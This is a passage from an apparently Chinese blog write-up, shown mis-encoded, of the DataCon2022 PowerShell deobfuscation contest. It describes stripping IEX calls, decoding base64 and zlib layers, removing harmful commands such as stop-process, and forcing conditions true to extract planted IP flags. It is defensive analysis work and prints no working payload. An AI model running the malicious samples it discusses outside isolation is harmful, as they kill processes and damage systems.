class="code"><pre><code class="hljs python">content_lines = content.split(<span class="hljs-string">&quot;\n&quot;</span>) <span class="hljs-comment">#æŒ‰è¡Œåˆ†å‰²</span><br><span class="hljs-keyword">for</span> content <span class="hljs-keyword">in</span> content_lines: <br><span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> line_check(content): <span class="hljs-comment"># æ£€æŸ¥æ˜¯å¦æœ‰flagçš„ç‰¹å¾</span><br><span class="hljs-keyword">continue</span><br>has_flag, content = line_deobfuscation(content) <span class="hljs-comment"># å¯¹æ•´è¡Œæ‰§è¡Œé€’å½’å»é™¤IEXåæ··æ·†æ“ä½œ</span><br><span class="hljs-keyword">if</span> has_flag: <span class="hljs-comment"># flagä¸ºåŒ¹é…åˆ°ipçš„è¡¨ç¤º</span><br><span class="hljs-keyword">continue</span><br>status, content = find_param(content) <span class="hljs-comment"># æå–å˜é‡</span><br><span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> status: <span class="hljs-comment"># æ˜¯å¦æœ‰å˜é‡</span><br><span class="hljs-keyword">continue</span><br>has_flag, content = line_deobfuscation(content) <span class="hljs-comment"># å¯¹å˜é‡é€’å½’å»é™¤IEXåæ··æ·†</span><br><span class="hljs-keyword">if</span> has_flag:<br><span class="hljs-keyword">continue</span><br></code></pre></td></tr></table></figure><h3 id="2-3-3-è°ƒç”¨Invoke-Deobfuscation"><a href="#2-3-3-è°ƒç”¨Invoke-Deobfuscation" class="headerlink" title="2.3.3 è°ƒç”¨Invoke-Deobfuscation"></a>2.3.3 è°ƒç”¨Invoke-Deobfuscation</h3><p>å¯¹äºå‰©ä½™çš„æƒ…å†µï¼Œæˆ‘ä»¬åˆ©ç”¨Invoke-Deobfuscationå·¥å…·è¿›è¡Œåæ··æ·†ã€‚æ ¹æ®ã€ŠInvoke-Deobfuscation:AST-Based and Semantics-Preserving Deobfuscation for PowerShell Scriptsã€‹ï¼ŒInvoke-Deobfuscationå·¥å…·æ˜¯é€šè¿‡æ„å»ºASTè¯­æ³•æ ‘çš„æ–¹å¼è¿›è¡Œåæ··æ·†ã€‚è¯¥å·¥å…·çš„æ··æ·†æ­¥éª¤ä¸»è¦æœ‰ä¸‰æ­¥ï¼šTokenè§£æã€åŸºäºASTè¯­æ³•æ ‘åæ··æ·†ã€é‡å‘½åä¸æ ¼å¼è§„èŒƒã€‚å…¶ä¸­ï¼ŒåŸºäºASTè¯­æ³•æ ‘çš„åæ··æ·†ä¸»è¦åŒ…æ‹¬è¯†åˆ«å¯æ¢å¤ç‰‡æ®µã€åŸºäºè°ƒç”¨çš„æ¢å¤ã€å˜é‡è¿½è¸ªå’ŒIEXå»é™¤ä¸è„šæœ¬é‡æ„å››ä¸ªéƒ¨åˆ†ã€‚ä¸ºäº†æé«˜æ•ˆç‡ï¼Œæˆ‘ä»¬å»é™¤äº†Invoke-Deobfuscationå·¥å…·ä¸­é‡å‘½åä¸æ ¼å¼è§„èŒƒéƒ¨åˆ†çš„å†…å®¹ã€‚</p><p><img src="/2023/01/28/DataCon2022WriteUp/Untitled%201.png" alt="Invoke-Deobfuscationå·¥å…·"></p><h1 id="ä¸‰ã€æ¢ç´¢ä¸åç»­"><a href="#ä¸‰ã€æ¢ç´¢ä¸åç»­" class="headerlink" title="ä¸‰ã€æ¢ç´¢ä¸åç»­"></a>ä¸‰ã€æ¢ç´¢ä¸åç»­</h1><h2 id="3-1-æ¢ç´¢"><a href="#3-1-æ¢ç´¢" class="headerlink" title="3.1 æ¢ç´¢"></a>3.1 æ¢ç´¢</h2><p>é€šè¿‡å¤šæ–¹è°ƒç ”ï¼Œæˆ‘ä»¬å‚è€ƒäº†è®ºæ–‡ã€ŠInvoke-Deobfuscation:AST-Based and Semantics-Preserving Deobfuscation for PowerShell Scriptsã€‹ï¼Œå°è¯•äº†ä½¿ç”¨Invoke-Deobfuscationã€PowerDecodeåæ··æ·†ä½œä¸ºè§£å†³æ–¹æ¡ˆä¹‹ä¸€ã€‚</p><p>PowerDecodeåœ¨å¤„ç†ä¸€èˆ¬æ··æ·†æƒ…å†µä¸‹æœ‰ç€ä¸é”™çš„æ—¶é—´æ•ˆç‡ï¼Œä½†æ˜¯å½“æ‰¹é‡å¤„ç†æ··æ·†è„šæœ¬æ—¶ï¼ŒPowerDecodeå¾ˆä¸ç¨³å®šï¼Œå› æ­¤æˆ‘ä»¬èˆå¼ƒäº†è¿™ä¸ªæ–¹æ³•ã€‚</p><p>Invoke-Deobfuscationä½œä¸ºå®˜æ–¹å»ºè®®çš„å¼€æºå·¥å…·ï¼Œåœ¨å¤„ç†å„ç§é—®é¢˜ä¸Šæœ‰ç€ä¸é”™çš„ç­”æ¡ˆï¼Œä½†æ˜¯ç”±äºASTæ ‘çš„æ„é€ éœ€è¦è€—è´¹å¤§é‡æ—¶é—´ï¼Œå°¤å…¶æ˜¯å½“æ··æ·†è„šæœ¬è¾ƒå¤§æ—¶ï¼Œæ—¶é—´æˆæœ¬é«˜ï¼Œä½†æ˜¯ä»‹äºå…¶ä¼˜ç§€çš„åæ··æ·†èƒ½åŠ›ï¼Œæˆ‘ä»¬å°†å…¶èå…¥åˆ°æˆ‘ä»¬çš„ç¨‹åºä¸­ï¼Œä½œä¸ºipæ­£ç¡®æ‰¾åˆ°çš„ä¿éšœã€‚</p><h2 id="3-2-åç»­"><a href="#3-2-åç»­" class="headerlink" title="3.2 åç»­"></a>3.2 åç»­</h2><p>å¯¹ä¸€äº›ipæ··æ·†äºå¤šè¡Œçš„è„šæœ¬ä¾æ—§æ— æ³•è¯†åˆ«ï¼Œç”±äºæˆ‘ä»¬ä½¿ç”¨çš„æ˜¯â€™\nâ€™çš„æ–¹å¼è¿›è¡Œæ¯è¡Œçš„åˆ†å‰²ï¼Œå› æ­¤éœ€è¦æå‡ºè¾ƒä¸ºæˆç†Ÿçš„è§£å†³å•è¡Œæå–åå­˜åœ¨è¯­æ³•æ–­å±‚å¯¼è‡´è¯­æ³•é”™è¯¯çš„é—®é¢˜ï¼Œæˆ‘ä»¬è®¡åˆ’ä½¿ç”¨ç¬¦å·åŒ¹é…çš„æ–¹å¼è¿›è¡Œè§£å†³ï¼Œé€šè¿‡è¡¥å……ç¬¦å·è§£å†³è¯­æ³•é”™è¯¯ã€‚</p><p>å¯¹äºè¾ƒå¤§çš„æ–‡ä»¶ï¼Œåæ··æ·†çš„è¿‡ç¨‹ä¸­ä¼šå› ä¸ºæ—¶é—´è¿‡é•¿ä»è€Œè¶…æ—¶ã€‚æœ‰äº›æ–‡ä»¶å­˜åœ¨å¯¹æŠ—çš„ä»£ç ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡è®¾ç½®ä¸€ä¸ªé»‘åå•å…¨éƒ¨ç¦æ­¢ï¼Œä»è€Œé™ä½æ—¶é—´ä»£ä»·ã€‚åŒæ—¶ï¼Œå¤§çš„æ–‡ä»¶å»ºç«‹çš„astæ ‘æ‰€éœ€çš„æ—¶é—´ä¹Ÿå°±è¶Šé•¿ï¼Œæˆ‘ä»¬æ‰“ç®—å®ç°æ— ç”¨ä»£ç çš„åˆ é™¤ï¼Œä»è€Œè¾¾åˆ°å‹ç¼©è„šæœ¬ä½“ç§¯ï¼Œæé«˜æ—¶é—´æ•ˆç‡çš„ç›®çš„ï¼Œä½†æ˜¯ç”±äºç«èµ›æ—¶é—´æœ‰é™ï¼Œæˆ‘ä»¬æœªèƒ½å®Œå–„ã€‚</p><h1 id="å››ã€æ€»ç»“"><a href="#å››ã€æ€»ç»“" class="headerlink" title="å››ã€æ€»ç»“"></a>å››ã€æ€»ç»“</h1><p>è¿™æ¬¡æ¯”èµ›æˆ‘ä»¬é€‰æ‹©äº†ä¹‹å‰éƒ½æœªæ›¾æ·±å…¥æ¶‰çŒçš„é¢†åŸŸï¼Œåœ¨è§£é¢˜æ—¶phpåæ··æ·†å¯å‘äº†æˆ‘ä»¬ï¼Œè®©æˆ‘ä»¬å¯ä»¥æˆåŠŸçš„å–å¾—å¾ˆå¤šipç»“æœã€‚</p><p>åç»­å¯ä»¥é€šè¿‡å®Œå–„æ¨¡æ‹Ÿæ‰§è¡Œè¿‡ç¨‹ä¸å¯¹å¤§æ–‡ä»¶åœ¨ä¿è¯è¯­æ³•è¯­æ„ä¸€è‡´æ€§çš„å‰æä¸‹è¿›è¡Œåˆ‡å‰²ä»è€Œé™ä½æ—¶é—´ä»£ä»·ï¼ŒNLPçš„è¿ç”¨ä¹Ÿå¯èƒ½å¯ä»¥å¸®åŠ©ä¿®å¤å•è¡Œå¤„ç†æ—¶è¯­æ³•è¯­æ„é”™è¯¯çš„é—®é¢˜ã€‚</p><p>æ„Ÿè°¢ä¸»åŠæ–¹æä¾›äº†è¿™æ ·ä¸€ä¸ªä¼˜ç§€çš„å¹³å°å’Œä¸°å¯Œçš„æ•°æ®ï¼Œæå¤§çš„è¿˜åŸäº†çœŸå®ç¯å¢ƒä¸‹çš„å„ç§çŠ¶å†µï¼Œä¹Ÿæ„Ÿè°¢å‡ºé¢˜äººä¸åŒå…¶çƒ¦åœ°è§£ç­”æˆ‘ä»¬å„ç§é—®é¢˜ã€‚åœ¨æœ¬æ¬¡æ¯”èµ›ä¸­ï¼Œæˆ‘ä»¬ä¸ä»…æ”¶è·äº†çŸ¥è¯†ï¼Œä¹Ÿæ‰¾åˆ°äº†ä¸€äº›å¿—åŒé“åˆçš„æœ‹å‹ï¼Œä¹Ÿæ·±åˆ»ä½“ä¼šåˆ°äº†ä¸åˆ°æœ€åä¸æ”¾å¼ƒçš„é‡è¦æ€§ã€‚</p><h1 id="Powershellåæ··æ·†-Level02"><a href="#Powershellåæ··æ·†-Level02" class="headerlink" title="Powershellåæ··æ·†-Level02"></a><strong>Powershellåæ··æ·†-Level02</strong></h1><h1 id="ä¸€ã€é¢˜ç›®ä»‹ç»-1"><a href="#ä¸€ã€é¢˜ç›®ä»‹ç»-1" class="headerlink" title="ä¸€ã€é¢˜ç›®ä»‹ç»"></a>ä¸€ã€é¢˜ç›®ä»‹ç»</h1><h2 id="1-1-é¢˜ç›®èƒŒæ™¯-1"><a href="#1-1-é¢˜ç›®èƒŒæ™¯-1" class="headerlink" title="1.1 é¢˜ç›®èƒŒæ™¯"></a>1.1 é¢˜ç›®èƒŒæ™¯</h2><p>PowerShellæ˜¯æ”»å‡»è€…å¸¸ç”¨çš„è„šæœ¬ï¼Œé€šå¸¸å¸¦æœ‰å¤§é‡çš„æ··æ·†ï¼Œå¯¼è‡´æ£€æµ‹ã€åˆ†æååˆ†å›°éš¾ã€‚é€‰æ‰‹é€šè¿‡åˆ†æä¸»åŠæ–¹æä¾›çš„æ··æ·†PowerShellæ–‡ä»¶ï¼Œå°è¯•åæ··æ·†å¾—åˆ°PowerShellæ ·æœ¬ä¸­é¢„å…ˆæ¤å…¥çš„flagã€‚</p><h2 id="1-2-é¢˜ç›®è¦æ±‚-1"><a href="#1-2-é¢˜ç›®è¦æ±‚-1" class="headerlink" title="1.2 é¢˜ç›®è¦æ±‚"></a>1.2 é¢˜ç›®è¦æ±‚</h2><p>PowerShellæ ·æœ¬æ•°æ®é›†åŒ…å«åˆ©ç”¨å„ç§æ··æ·†æ‰‹æ®µæ··æ·†åçš„PowerShellæ ·æœ¬1000ä¸ªï¼Œé€‰æ‰‹éœ€è¦å¼€å‘è‡ªåŠ¨åŒ–åˆ†æå·¥å…·ï¼Œæå–å…¶ä¸­æ¤å…¥çš„flagã€‚</p><p>æ•°æ®é›†åˆ†ä¸¤ä¸ªé˜¶æ®µå‘æ”¾ï¼Œç¬¬ä¸€é˜¶æ®µæ•°æ®é›†AåŒ…å«800ä¸ªåŸºäºéæ¶æ„æ ·æœ¬æ”¹é€ çš„æ ·æœ¬ï¼Œç¬¬äºŒé˜¶æ®µæ•°æ®é›†BåŒ…å«200ä¸ªç‰¹æ®Šè®¾è®¡çš„æ··æ·†æ ·æœ¬ï¼Œå…¶ä¸­åŒ…å«å®é™…çš„æœ‰æ½œåœ¨ã€ç ´åæ€§ã€‘çš„æ¶æ„æ ·æœ¬æ”¹é€ çš„æ ·æœ¬ã€‚å› æ­¤é€‰æ‰‹éœ€åœ¨å¯æ§çš„éš”ç¦»ç¯å¢ƒä¸­è¿›è¡Œåˆ†ææµ‹è¯•ï¼Œè§„é¿æ½œåœ¨çš„å®‰å…¨å¨èƒã€‚</p><h2 id="1-3-æ•°æ®è¯´æ˜-1"><a href="#1-3-æ•°æ®è¯´æ˜-1" class="headerlink" title="1.3 æ•°æ®è¯´æ˜"></a>1.3 æ•°æ®è¯´æ˜</h2><p>å…¬å¼€æ•°æ®é›†ä¸­æ¯ä¸ªæ–‡ä»¶ä»¥æ ·æœ¬å†…å®¹çš„sha256å€¼å‘½åï¼Œæ²¡æœ‰åç¼€ï¼Œæ–‡ä»¶å†…å®¹ä¸ºæ··æ·†è¿‡çš„PowerShellæ–‡ä»¶ã€‚æ ·æœ¬æ–‡ä»¶ä¸­çš„flagæ ‡è®°å½¢å¼ä¸ºï¼šâ€ip:255.255.255.255â€œï¼ˆä¸åŒ…æ‹¬å‰ååŒå¼•å·ï¼Œå‰ç¼€ç»Ÿä¸€ä¸ºip:ï¼Œç´§è·Ÿçš„æ•°å­—ä¸ºåˆæ³•IPåœ°å€èŒƒå›´å†…å¯å˜å€¼ï¼‰ã€‚</p><p>âš ï¸æ³¨æ„äº‹é¡¹ï¼šä¸€ä¸ªæ ·æœ¬åªåŒ…å«ä¸€ä¸ªflagï¼ŒåŒä¸€ä¸ªæ ·æœ¬æäº¤å¤šä¸ªflagï¼Œç³»ç»Ÿåªä¼šæ ¹æ®ç¬¬ä¸€ä¸ªflagåˆ¤åˆ†ã€‚</p><h1 id="äºŒã€è§£é¢˜æ€è·¯-1"><a href="#äºŒã€è§£é¢˜æ€è·¯-1" class="headerlink" title="äºŒã€è§£é¢˜æ€è·¯"></a>äºŒã€è§£é¢˜æ€è·¯</h1><h2 id="2-1-æ•°æ®åˆ†æ"><a href="#2-1-æ•°æ®åˆ†æ" class="headerlink" title="2.1 æ•°æ®åˆ†æ"></a>2.1 æ•°æ®åˆ†æ</h2><p>ç”±äºè¿™é“é¢˜çš„æ ·æœ¬æ˜¯äººä¸ºç²¾å¿ƒæ”¹é€ çš„ï¼Œæˆ‘ä»¬åœ¨è·å–åˆ°200ä¸ªæ•°æ®é›†æ—¶ï¼Œé¦–å…ˆå¯¹æ•°æ®è¿›è¡Œäº†æ·±å…¥çš„åˆ†æï¼Œå‘ç°æ–‡ä»¶ä¸­çš„å†…å®¹åˆ†ä¸ºä¸¤ç§ï¼šä¸€å¥è¯powershellå‘½ä»¤å’Œæ··æ·†åçš„powershellè„šæœ¬ã€‚å¦å¤–æ··æ·†çš„æ–¹å¼ä¹Ÿå¤šç§å¤šæ ·ï¼Œæ¶‰åŠå­—ç¬¦ä¸²æ··æ·†ã€base64ç¼–ç æ··æ·†ã€å‡½æ•°å’Œå¯¹è±¡çš„æ··æ·†ç­‰ã€‚</p><p>é™¤äº†åŸºæœ¬çš„æ··æ·†å¤–ï¼Œæ•°æ®ä¸­çš„æ ·æœ¬ä¹Ÿæºå¸¦å®é™…çš„æ¶æ„è¡Œä¸ºï¼Œä¾‹å¦‚æ€è¿›ç¨‹ã€æ€è¿è¡Œç•Œé¢ï¼›æ­¤å¤–è¿˜å­˜åœ¨ä¸€äº›å¯¹æŠ—æ‰‹æ®µï¼Œä¾‹å¦‚ä¼‘çœ ã€‚</p><p>æœ€åflagçš„ä½ç½®ä¹Ÿè¢«å‡ºé¢˜äººç²¾å¿ƒè®¾è®¡è¿‡ï¼ŒFlagçš„ä½ç½®æœ‰äº›æ˜¯åœ¨è¿è¡Œåçš„æ ‡å‡†è¾“å‡ºä¸­ï¼Œæœ‰äº›æ˜¯åœ¨è¿è¡Œåå°†flagå†™å…¥åˆ°ä¸€ä¸ªæ–‡ä»¶ä¸­ã€‚é™¤äº†ä¸Šé¢æ­£å¸¸çš„æƒ…å†µï¼Œè¿˜æœ‰ä¸€äº›flagéšè—åœ¨æ°¸è¿œä¸ä¼šè¢«ä½¿ç”¨çš„å˜é‡ä¸­ï¼Œæˆ–è€…æ°¸è¿œä¸ä¼šæ‰§è¡Œçš„ä»£ç ç‰‡æ®µï¼Œå¯¹äºè¿™ç§æƒ…å†µæˆ‘ä»¬é€šè¿‡æ‰§è¡Œæ ·æœ¬å¹¶ä¸ä¼šå¾—åˆ°æœ€ç»ˆçš„flagã€‚</p><h2 id="2-2-å…·ä½“æ€è·¯"><a href="#2-2-å…·ä½“æ€è·¯" class="headerlink" title="2.2 å…·ä½“æ€è·¯"></a>2.2 å…·ä½“æ€è·¯</h2><p>åœ¨å¯¹æ•°æ®è¿›è¡Œæ·±å…¥åˆ†æä»¥åŠå¤šæ–¹é¢è°ƒç ”åï¼Œæˆ‘ä»¬å€Ÿé‰´äº†é™æ€åˆ†æé¢†åŸŸç¬¦å·æ‰§è¡Œçš„æ€æƒ³ã€‚ç¬¬ä¸€æ­¥ï¼šå…ˆå»é™¤æ ·æœ¬ä¸­çš„iexæŒ‡ä»¤ï¼Œç„¶ååˆ©ç”¨PowerShellçš„è§£ç èƒ½åŠ›å¯¹æ··æ·†åçš„æ ·æœ¬è¿›è¡Œå»æ··æ·†ï¼Œç›´åˆ°å¾—åˆ°æ˜æ–‡æ•°æ®ã€‚ç¬¬äºŒæ­¥ï¼šå¯¹ä»£ç è¿›è¡Œé‡æ„ï¼Œåˆ é™¤æ˜æ–‡æ•°æ®ä¸­çš„æœ‰å®³&#x2F;æ— ç”¨çš„ä»£ç ï¼Œä¾‹å¦‚stop-processã€| not-nullç­‰ï¼Œé¿å…æ¶æ„è¡Œä¸ºä»¥åŠå¯¹æŠ—æ‰‹æ®µï¼›å¦å¤–ä¹Ÿå¯¹ä»£ç çš„é€»è¾‘è¿›è¡Œäº†ä¿®æ”¹ï¼Œè§£å†³flagè—åœ¨æ°¸è¿œä¸ä¼šæ‰§è¡Œçš„ä»£ç ç‰‡æ®µä¸­ä»¥åŠæ°¸è¿œä¸ä¼šä½¿ç”¨çš„å˜é‡ä¸­ï¼›æœ€åå°±æ˜¯é€šè¿‡æ­£åˆ™è¡¨è¾¾å¼åœ¨æ‰§è¡Œåçš„è¾“å‡ºå†…å®¹ä¸­è·å–flagã€‚æ€»ä½“æ€è·¯çš„æµç¨‹å›¾å¦‚ä¸‹ï¼š</p><p><img src="/2023/01/28/DataCon2022WriteUp/Untitled%202.png" alt="è§£é¢˜æ€è·¯"></p><h3 id="2-2-1-åæ··æ·†"><a href="#2-2-1-åæ··æ·†" class="headerlink" title="2.2.1 åæ··æ·†"></a>2.2.1 åæ··æ·†</h3><p>æ ¹æ®æˆ‘ä»¬å¯¹æ ·æœ¬çš„ç»Ÿè®¡ï¼Œå‘ç°å­˜åœ¨ä¸€äº›<code>ä½¿ç”¨iexæŒ‡ä»¤è§£ç </code>ä»¥åŠ<code>ä¸€å¥è¯PowerShellå‘½ä»¤</code>çš„æ ·æœ¬ï¼Œå°†ä»–ä»¬æ¢å¤å‡ºæ¥ä¹‹åå¯ä»¥å¾—åˆ°ä¸å…¶ä»–æ ·æœ¬ç›¸åŒçš„æ ¼å¼ï¼Œæ‰€ä»¥ç¬¬ä¸€æ­¥æˆ‘ä»¬å¯¹æ•´ä¸ªæ ·æœ¬é›†éœ€è¦è¿›è¡Œåæ··æ·†ï¼Œæ¥ä¸‹æ¥æŒ‰ç…§ä¸åŒçš„æ··æ·†ç±»åˆ«æ¥è¿›è¡Œè¯¦ç»†è¯´æ˜</p><ul><li><strong>ä½¿ç”¨iexæŒ‡ä»¤è§£ç æ ·æœ¬</strong></li></ul><p>å¯¹äºä½¿ç”¨iexæŒ‡ä»¤è§£ç çš„æ ·æœ¬ï¼Œæˆ‘ä»¬å¥—ç”¨level1çš„æ€è·¯ï¼Œå¯¹æ ·æœ¬è¿›è¡ŒiexæŒ‡ä»¤ä½ç½®è¯†åˆ«ï¼ŒiexæŒ‡ä»¤åˆ é™¤ï¼Œæ··æ·†éƒ¨åˆ†è½½å…¥PowerShellåŠ¨æ€æ‰§è¡Œä¸‰ä¸ªæ­¥éª¤ï¼Œæœ€åè·å¾—æ··æ·†å‰çš„æ˜æ–‡æ ·æœ¬ã€‚</p><ul><li><strong>ä¸€å¥è¯PowerShellå‘½ä»¤æ ·æœ¬</strong></li></ul><p>å¯¹äºPowerShellä¸€å¥è¯å‘½ä»¤çš„æ ·æœ¬ï¼Œæˆ‘ä»¬åˆ†æå¾—åˆ°æœ€ç»ˆçš„è§£ç æµç¨‹ï¼šæå–PowerShellä¸€å¥è¯å‘½ä»¤ä¸­ä½¿ç”¨Base64ç¼–ç çš„å†…å®¹E1ï¼Œè¿›è¡Œè§£ç ï¼Œå¾—åˆ°æ˜æ–‡D1ï¼›åˆ é™¤æ˜æ–‡D1ä¸­å­˜åœ¨çš„ä¸å¯è§å­—ç¬¦åï¼Œåœ¨æå–å‡ºå…¶ä¸­åŒ…è£¹çš„Base64ç¼–ç å†…å®¹E2ï¼Œè¿›è¡Œè§£ç ï¼Œå¾—åˆ°ä½¿ç”¨zlibè¿›è¡Œç¼–ç çš„å†…å®¹E3ï¼›æœ€åå¯¹E3è¿›è¡Œzlib defaultæ¨¡å¼çš„è§£ç å¾—åˆ°ä¸­çš„æ˜æ–‡Mã€‚</p><h3 id="2-2-2-ä»£ç é‡æ„"><a href="#2-2-2-ä»£ç é‡æ„" class="headerlink" title="2.2.2 ä»£ç é‡æ„"></a>2.2.2 ä»£ç é‡æ„</h3><p>ä»£ç é‡æ„éƒ¨åˆ†æ˜¯æˆ‘ä»¬level2è§£é¢˜çš„é‡ç‚¹ã€‚è¯¥éƒ¨åˆ†ä¸»è¦åˆ†ä¸ºä¸‰ä¸ªæ­¥éª¤ï¼š<code>æœ‰å®³/æ— ç”¨ä»£ç å»é™¤</code>ã€<code>åˆ¤æ–­è¯­å¥é€»è¾‘ä¿®æ”¹</code>ã€<code>ç»“æœè¾“å‡ºè¯­å¥æ·»åŠ </code>ï¼Œæ¥ä¸‹æ¥å°†é€æ­¥æè¿°ä»£ç é‡æ„çš„ä¸‰ä¸ªæ­¥éª¤ã€‚</p><ul><li><strong>æœ‰å®³&#x2F;æ— ç”¨ä»£ç å»é™¤</strong></li></ul><p>æˆ‘ä»¬é€šè¿‡å¯¹æ ·æœ¬æ•°æ®çš„è§‚å¯Ÿã€ç»Ÿè®¡ï¼Œé’ˆå¯¹æœ¬æ¬¡æ¯”èµ›çš„æ ·æœ¬å®šä¹‰äº†<code>æ— ç”¨/æœ‰å®³ä»£ç é›†</code>ã€‚</p><p><img src="/2023/01/28/DataCon2022WriteUp/Untitled%203.png" alt="æœ‰å®³/æ— ç”¨ä»£ç é›†"></p><p>åˆ†è¡Œè¯»å–æ ·æœ¬ä¸­çš„å†…å®¹ï¼Œåˆ¤æ–­æ˜¯å¦ç¬¦åˆæ— ç”¨&#x2F;æœ‰å®³ä»£ç çš„ç‰¹å¾ï¼Œè‹¥ç¬¦åˆåˆ™è¿›è¡Œå»é™¤ï¼Œåä¹‹ä¿ç•™åœ¨ä»£ç ä¸­ã€‚</p><ul><li><strong>åˆ¤æ–­è¯­å¥é€»è¾‘ä¿®æ”¹</strong></li></ul><p>æˆ‘ä»¬å‘ç°å¾ˆå¤šfunctionä¸­å­˜åœ¨<code>if-else</code>è¯­å¥ï¼Œé€šè¿‡ä¸å‡ºé¢˜äººçš„äº¤æµå’Œäººå·¥æå–flagç­‰æ–¹æ³•ï¼Œæ€»ç»“å‡ºéœ€è¦ä¿®æ”¹åˆ¤æ–­è¯­å¥ä¸ºæ°¸çœŸï¼Œæ‰èƒ½å…¨é¢åœ°æå–flagã€‚</p><p>åœ¨PowerShellä¸­if-elseç±»å‹è¯­å¥æ€»å…±æœ‰ä¸‰ç§æ ‡è¯†ï¼Œåˆ†åˆ«ä¸º<code>if</code>ã€<code>elseif</code>ã€<code>else</code>ã€‚é¦–å…ˆæˆ‘ä»¬ä¼šæå–æ‰€æœ‰<code>if-else</code>è¯­å¥ï¼Œå¹¶å»é™¤åŸå§‹æ ·æœ¬ä¸­å¯èƒ½å­˜åœ¨çš„æ¢è¡Œå½±å“ï¼›å…¶æ¬¡æˆ‘ä»¬å°†æ‰€æœ‰çš„<code>if-else</code>è¯­å¥çš„æ¡ä»¶åˆ¤æ–­æ”¹ä¸ºæ°¸çœŸå¼<code>if($True)</code>ã€‚</p><p>æœ¬æ–¹æ³•ç›¸è¾ƒäºå…¶ä»–æ–¹æ³•çš„ä¼˜åŠ¿åœ¨äºåªéœ€è¦ç€çœ¼äºæ¡ä»¶åˆ¤æ–­çš„ä¸€è¡Œï¼Œä¸éœ€è¦å¯¹æ•´ä¸ª<code>if-else</code>è¯­å¥å—è¿›è¡Œè¯†åˆ«ï¼Œä»æ“ä½œéš¾åº¦ä¸æ•ˆç‡ä¸Šæ¥è¯´ï¼Œæ›´åŠ å…·æœ‰ä¼˜åŠ¿ã€‚</p><ul><li><strong>ç»“æœè¾“å‡ºè¯­å¥æ·»åŠ </strong></li></ul><p>æ ¹æ®æˆ‘ä»¬å¯¹æ ·æœ¬çš„åˆ†æï¼Œæˆ‘ä»¬å‘ç°è®¸å¤šflagéšè—åœ¨å˜é‡ä¹‹ä¸­ï¼Œä½†åŸç¨‹åºä¸æ”¯æŒç›´æ¥è¾“å‡ºï¼ˆå³ä½¿æ˜¯æˆ‘ä»¬åˆ é™¤äº†out-nullä¹‹åï¼‰ï¼Œå› è€Œæˆ‘ä»¬å®šä¹‰äº†ä¸€äº›ç¨‹åºåˆ†å‰²ç‚¹ï¼Œåœ¨åˆ†å‰²ç‚¹å¤„å¯¹æœ€åä¸€ä¸ªå‚æ•°çš„å€¼è¿›è¡Œè¾“å‡ºã€‚</p><p><img src="/2023/01/28/DataCon2022WriteUp/Untitled%204.png" alt="ç¨‹åºåˆ†å‰²ç‚¹é›†"></p><h3 id="2-2-3-è¿è¡Œè·å–ç»“æœ"><a href="#2-2-3-è¿è¡Œè·å–ç»“æœ" class="headerlink" title="2.2.3 è¿è¡Œè·å–ç»“æœ"></a>2.2.3 è¿è¡Œè·å–ç»“æœ</h3><p>æ ¹æ®æˆ‘ä»¬çš„åˆ†æï¼Œflagä¸»è¦éšè—åœ¨å‚æ•°å€¼å’Œç”Ÿæˆçš„æ¶æ„æ–‡ä»¶ä¸­ã€‚å› è€Œæˆ‘ä»¬è·å–flagçš„æ–¹å¼ä¸»è¦æœ‰ä¸¤ç§ï¼Œåˆ†åˆ«ä¸ºé‡æ„ä»£ç è¿è¡Œç»“æœè¯†åˆ«è¯»å–flagï¼Œå¯¹æœ¬åœ°æ–°å¢æ–‡ä»¶å†…å®¹è¯†åˆ«è¯»å–flagã€‚</p><p>é¦–å…ˆï¼Œæˆ‘ä»¬å°†è®°å½•å½“å‰æ–‡ä»¶ç›®å½•ä¸‹çš„æ‰€æœ‰æ–‡ä»¶ï¼›å…¶æ¬¡ï¼Œæ¨¡æ‹Ÿè¿è¡Œ2.2.2ä¸­é‡æ„çš„ä»£ç ï¼Œè¯†åˆ«è¿è¡Œç»“æœä¸­çš„flagä¿¡æ¯ï¼›å¯¹æ²¡æœ‰è¯†åˆ«å‡ºflagçš„æ ·æœ¬ï¼Œæˆ‘ä»¬ä¼šé‡æ–°è·å–å½“å‰ç›®å½•ä¸‹çš„æ‰€æœ‰æ–‡ä»¶ä¿¡æ¯ï¼Œå¯¹æ¯”æŸ¥æ‰¾æ–°ç”Ÿæˆçš„æ–‡ä»¶ï¼Œè¯»å–å…¶ä¸­çš„å†…å®¹ï¼Œè¯†åˆ«flagä¿¡æ¯ã€‚</p><h1 id="ä¸‰ã€æ¢ç´¢å’Œåç»­"><a href="#ä¸‰ã€æ¢ç´¢å’Œåç»­" class="headerlink" title="ä¸‰ã€æ¢ç´¢å’Œåç»­"></a>ä¸‰ã€æ¢ç´¢å’Œåç»­</h1><h2 id="3-1-æ¢ç´¢-1"><a href="#3-1-æ¢ç´¢-1" class="headerlink" title="3.1 æ¢ç´¢"></a>3.1 æ¢ç´¢</h2><p>ç”±äºæ„å»ºçš„æ ·æœ¬ä¸ä»…æ··æ·†æ–¹æ³•å¤šï¼Œè€Œä¸”flagçš„ä½ç½®ä¹Ÿå¤šç§å¤šæ ·ã€‚æˆ‘ä»¬æœ€å¼€å§‹çš„æƒ³æ³•æ˜¯æŠŠæ‰€æœ‰å˜é‡çš„å€¼é€šè¿‡è§£æä»£ç è·å–åˆ°ï¼Œç„¶åå°†å˜é‡(variable name)ç”¨å˜é‡çš„å€¼(variable value)æ›¿æ¢ï¼Œæœ€ååªè¿è¡Œä¸€è¡Œæˆ–è€…ä¸€éƒ¨åˆ†ä»£ç ç‰‡æ®µã€‚é€šè¿‡è¿™æ ·çš„æ–¹å¼æˆ‘ä»¬å¯ä»¥é€‰æ‹©è¿è¡Œæˆ‘ä»¬è®¤ä¸ºæœ€æœ‰å¯èƒ½å‡ºç°flagçš„ä»£ç ç‰‡æ®µï¼Œæé«˜æ•´ä½“çš„é€Ÿåº¦ï¼ŒåŒæ—¶å¯ä»¥ç»•è¿‡ä¸€äº›å¯¹æŠ—æ‰‹æ®µã€‚</p><p>ä½†æ˜¯åœ¨å®ç°åï¼Œå‘ç°æƒ…å†µæ¯”æˆ‘ä»¬æƒ³è±¡çš„è¦å¤æ‚å¾ˆå¤šï¼Œé¦–å…ˆæ˜¯æœ‰äº›å˜é‡çš„å€¼ï¼Œæˆ‘ä»¬æ— æ³•å‡†ç¡®è·å–ï¼›å…¶æ¬¡åœ¨å°†å˜é‡(variable name)ç”¨å˜é‡çš„å€¼(variable 